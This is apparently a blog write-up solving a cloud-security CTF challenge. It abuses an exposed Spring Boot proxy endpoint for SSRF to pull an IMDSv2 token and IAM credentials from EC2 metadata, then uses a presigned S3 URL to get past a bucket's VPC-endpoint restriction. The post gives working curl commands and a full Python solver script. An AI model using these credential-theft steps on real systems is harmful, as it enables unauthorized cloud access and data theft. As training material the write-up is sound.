---
title: "Cloud Security Championship - Perimeter Leak (June)"
date: 2025-07-11
draft: false
author: "Lychnobyte"
tags:
  - cloud
  - ctf
  - aws
  - ec2
  - ssrf
  - s3
image: "https://cdn.hashnode.com/res/hashnode/image/upload/v1752125118704/ccaa4cdd-b87f-4a9e-808e-efaf4eff1857.jpeg"
description: "Exploring EC2 SSRF to bypass AWS data perimeters and access S3 bucket contents."
toc: true
---

> **_Cover Illustration source_** [https://www.pixiv.net/en/artworks/91119415](https://www.pixiv.net/en/artworks/91119415)

Hello folks! Let’s talk again about cloud security challenges!

This time i’ll write about my solution for challenge in `Cloud Security Championship` platform. The platform and the challenge are still up you access here at [https://cloudsecuritychampionship.com/](https://cloudsecuritychampionship.com). So, basically the platform will release 1 challenge per month for 1 whole year so there will be a total of 12 challenges.

Fyi, the challenges author is [Scott Piper](https://x.com/0xdabbad00). The one that also created the infamous [flaws.cloud](http://flaws.cloud/) and [flaws2.cloud](http://flaws2.cloud/). If you not check it yet, better visit it now. It is like wargames ctf for cloud security along with complete guide step by step suitable for beginner who just start solving cloud security challenges.

Alright, now let’s start to solve first released challenges in June called `Perimeter Leak`. Here the challenge description.

> After weeks of exploits and privilege escalation you've gained access to what you hope is the final server that you can then use to extract out the secret flag from an S3 bucket.
>
> It won't be easy though. The target uses an AWS data perimeter to restrict access to the bucket contents.
>
> Good luck!

Also we got some message in web terminal console

> You've discovered a Spring Boot Actuator application running on AWS: curl [https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com](https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com) {"status":"UP"}

In challenge page you got challenge description and web terminal console like this. So, you can actually just solve the challenge using that terminal but i won’t use that.

![Challenge Page](https://cdn.hashnode.com/res/hashnode/image/upload/v1752126935252/96b68e94-97be-4e50-b4e7-f185b9ff5adb.png)

Let’s start from accessing the url using web browser, we only get response `Welcome to the proxy server.`

![Proxy Welcome](https://cdn.hashnode.com/res/hashnode/image/upload/v1752127177168/e6cd3b3f-3572-408e-b6eb-f12148c229dc.png)

Since we know that the application using `Spring Boot Actuator` we can try to accessing some endpoint that commonly misconfigured like `/actuator/mappings`. That shows all the MVC controller mappings, basically show all endpoint that available and how it is configured.

![Actuator Mappings](https://cdn.hashnode.com/res/hashnode/image/upload/v1752127655907/a3fd2fda-d494-4fa9-9d36-7b264c93c4a5.png)

Yeah, we got list of endpoint along with details configuration for each endpoint.

Let’s scroll down all the way to find some useful endpoint.

There is 2 endpoint that seems useful to me:

1. `/actuator/env` → show environment variable value

2. `/proxy` → endpoint that accept `url` parameter

First, let’s see the environment variable endpoint. Scroll down to `systemEnvironment` section.

![Actuator Env](https://cdn.hashnode.com/res/hashnode/image/upload/v1752204191893/bf2920dd-2922-4b57-ade0-af9edff3eebb.png)

From information above we know that our application is running on top of `EC2` server. We also find `BUCKET` variable which probably our `S3` bucket target named `challenge01-470f711`.

Next, check proxy endpoint. If you access endpoint directly with `url` parameter empty we got an error like this.

![Proxy Error](https://cdn.hashnode.com/res/hashnode/image/upload/v1752204469982/c8a58223-c15a-49cf-9276-723b264efb2e.png)

So, let’s try to fill `url` with something like `https://google.com`

![Proxy Filter](https://cdn.hashnode.com/res/hashnode/image/upload/v1752204573989/a34107e6-9369-48ee-88bd-5a6b57d774b9.png)

We got another error message. Now we know that the proxy only accept `IP address` or domain with `amazonaws.com` string in it.

Since we know that the application running on top of `EC2` maybe we can try to access metadata endpoint to get some credentials?

Try to fill `url` parameter with [`http://169.254.169.254/latest/meta-data/`](http://169.254.169.254/latest/meta-data/) to access `EC2` metadata.

![IMDS 401](https://cdn.hashnode.com/res/hashnode/image/upload/v1752204912193/7d329607-10a7-4aa5-9717-0010d92ad026.png)

Well, we got response `401 Unauthorized` which mean the `metadata` exist but we need some credentials to access that.

So, what kind of credentials we need to access `metadata`? Well, seems like our `EC2` target using `IMDSv2` that has authentication in it.

But, since we can do `SSRF` and there is no restriction `http method` we can use (look `/proxy` configuration below). It is easy for us to get that credentials.

![Proxy config](https://cdn.hashnode.com/res/hashnode/image/upload/v1752205213030/5d127867-5853-4d12-957c-4d1e96f356d9.png)

So, all we need is just to do `PUT` request to [`http://169.254.169.254/latest/api/token`](http://169.254.169.254/latest/api/token) with additional header `X-aws-ec2-metadata-token-ttl-seconds`. Here `curl` command to get the token.

```bash
curl -XPUT https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/proxy?url=http://169.254.169.254/latest/api/token \
-H "X-aws-ec2-metadata-token-ttl-seconds: 21600"
```

and we got the token

![IMDS Token](https://cdn.hashnode.com/res/hashnode/image/upload/v1752206027030/9eae231b-2e57-4e27-8d8c-876055285252.png)

Next try again to access the `metadata` using the token we just got. Here the `curl` command.

```bash
TOKEN="<token>"

curl https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/proxy?url=http://169.254.169.254/latest/meta-data/ \
-H "X-aws-ec2-metadata-token: $TOKEN"
```

It works now!

![IMDS Success](https://cdn.hashnode.com/res/hashnode/image/upload/v1752206239085/d5635944-52ba-475e-be59-99957e6e8b96.png)

Let’s steal some aws credentials!

So, the credentials we looking for are stored in `http://169.254.169.254/latest/meta-data/iam/security-credentials/<user>` to know what user are exist in the `EC2` just omit the `<user>`. Here `curl` command to steal aws credentials and also get region.

```bash
# To get region info
curl https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/proxy?url=http://169.254.169.254/latest/meta-data/placement/region \
-H "X-aws-ec2-metadata-token: $TOKEN"

# To list users
curl https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ \
-H "X-aws-ec2-metadata-token: $TOKEN"

# To retrieve aws credentials
curl https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/challenge01-5592368 \
-H "X-aws-ec2-metadata-token: $TOKEN"
```

Yeay, we got the credentials!

![AWS Creds stolen](https://cdn.hashnode.com/res/hashnode/image/upload/v1752212180808/7ad68e06-307f-42b2-9ecb-676c9de43c13.png)

Alright, now we have everything we need. Let set all info and credentials to be use by `aws cli`.

```bash
export AWS_DEFAULT_REGION=<region>
export AWS_ACCESS_KEY_ID=<AccessKeyId>
export AWS_SECRET_ACCESS_KEY=<SecretAccessKey>
export AWS_SESSION_TOKEN=<Token>
```

Then try to access the `S3` bucket we know earlier.

```bash
aws s3 ls s3://challenge01-470f711
```

Yap, we can list objects inside the bucket.

![S3 List](https://cdn.hashnode.com/res/hashnode/image/upload/v1752212699294/af9c6e35-8926-4bc5-9814-1ae4c1f61a21.png)

We can see there is `flag.txt` object inside `private/` directory. But, when try to download it we got `forbidden`. While we try to download `hello.txt` it return success.

![S3 Access Forbidden](https://cdn.hashnode.com/res/hashnode/image/upload/v1752212945328/4b972425-bbb7-4c90-8d1a-7fbb974776e4.png)

As written in challenges description, there is `restrict access to the bucket contents`. So, maybe the bucket content only accessible through `EC2` instance?

We can check the `S3` bucket policy using command below.

```bash
aws s3api get-bucket-policy --bucket challenge01-470f711 --output text | jq .
```

![Bucket Policy](https://cdn.hashnode.com/res/hashnode/image/upload/v1752231075872/886c3072-8d26-46ac-83db-23877cd0067d.png)

The policy shown that it will `deny` all request to objects in `/private` if the request not come from `vpce-0dfd8b6aa1642a057`. Which mean we need to access the `S3` bucket through `EC2` instance.

Well, we can use `SSRF` to access `s3` bucket content. But, how we pass the credentials to our `SSRF` request?

Luckily, there is something called `presigned url` that can `embedded` the credentials to the `url`. So, we can just pass that `presigned url` for our `SSRF`.

Let’s generate the `presigned url` then `urlencode` the generated url.

```bash
urlencode $(aws s3 presign s3://challenge01-470f711/private/flag.txt --expires-in 604800)
```

![Presigned URL](https://cdn.hashnode.com/res/hashnode/image/upload/v1752213772032/639ab1f8-bd14-4b3e-a563-437d3b6566c9.png)

Then access with browser, Ta-da we got the flag!

![Flag found](https://cdn.hashnode.com/res/hashnode/image/upload/v1752213989527/fd87d92d-94c4-4ce5-b35c-1a65de4e94c7.png)

Since the challenge still up and points still counted, i censored the flag. But, you can get it just by follow my solution. Well, just do some effort boys~ :D

But, if you lazy you can get the flag immediately using this script, lol XD

```python
import boto3
from urllib.parse import quote_plus
import requests

# Get aws credentials from EC2 instance metadata
chall_url = "https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com"
proxy_url = chall_url + "/proxy?url="

# Get the token for the metadata service
ssrf_url = proxy_url + "http://169.254.169.254/latest/api/token"
headers = {
    "X-aws-ec2-metadata-token-ttl-seconds": "21600"
}

imds_api_token = requests.put(ssrf_url, headers=headers, timeout=5)

wheaders = {
    "X-aws-ec2-metadata-token": imds_api_token.text
}

# Get the AWS credentials from the metadata service (IMDSv2)
ssrf_url = proxy_url + "http://169.254.169.254/latest/meta-data/iam/security-credentials/challenge01-5592368"
imds_creds = requests.get(ssrf_url, headers=headers, timeout=5)
creds_json = imds_creds.json()

# Set the AWS credentials
s3_client = boto3.client('s3', region_name='us-east-1',
                            aws_access_key_id=creds_json['AccessKeyId'],
                            aws_secret_access_key=creds_json['SecretAccessKey'],
                            aws_session_token=creds_json['Token'])

presigned_url = s3_client.generate_presigned_url(
    ClientMethod='get_object',
    Params={'Bucket': 'challenge01-470f711', 'Key': 'private/flag.txt'},
    HttpMethod='GET',
    ExpiresIn=3600  # URL expires in 1 hour
)

# Make the request
get_flag_url = proxy_url + quote_plus(presigned_url)
# response = requests.get(get_flag_url, timeout=5)
# print(response.text)
```

After solve the challenge, you will got the certificate like this.

![Certificate](https://cdn.hashnode.com/res/hashnode/image/upload/v1752214875670/2aeb7704-13fe-46d8-a915-ae3c40454d6d.png)

Alright, that’s it. See you next month with new challenge! :D

**Reference:**

* [https://medium.com/walmartglobaltech/perils-of-spring-boot-actuators-misconfiguration-185c43a0f785](https://medium.com/walmartglobaltech/perils-of-spring-boot-actuators-misconfiguration-185c43a0f785)

* [https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html)

* [https://docs.aws.amazon.com/AmazonS3/latest/userguide/ShareObjectPreSignedURL.html](https://docs.aws.amazon.com/AmazonS3/latest/userguide/ShareObjectPreSignedURL.html)
